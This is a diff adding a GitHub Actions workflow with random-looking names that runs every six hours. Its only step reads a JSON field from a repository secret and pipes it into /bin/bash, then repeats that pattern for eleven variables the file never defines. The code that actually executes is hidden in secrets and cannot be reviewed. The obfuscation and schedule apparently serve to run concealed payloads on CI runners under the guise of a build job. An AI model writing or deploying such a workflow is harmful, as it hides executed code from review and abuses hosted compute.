@@ -1,0 +1,28 @@
+name: guoshantui4678
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: guoshantui4678
+        env:
+          gz4: ${{ secrets.gz4 }}
+        run: |
+          echo $gz4 | jq -r .pzncp5077 | /bin/bash
+          echo $vn26118 | jq -r .vu6781 | /bin/bash
+          echo $j5444 | jq -r .l232 | /bin/bash
+          echo $fctdw113 | jq -r .f584 | /bin/bash
+          echo $iqv693 | jq -r .yawc4 | /bin/bash
+          echo $ha481 | jq -r .yj351 | /bin/bash
+          echo $eg005 | jq -r .qvd9 | /bin/bash
+          echo $bx0413 | jq -r .np799 | /bin/bash
+          echo $qcr1452 | jq -r .l970 | /bin/bash
+          echo $jnne35585 | jq -r .sfej1804 | /bin/bash
+          echo $lfps5098 | jq -r .a6 | /bin/bash
+          echo $sf2 | jq -r .oc76072 | /bin/bash
+
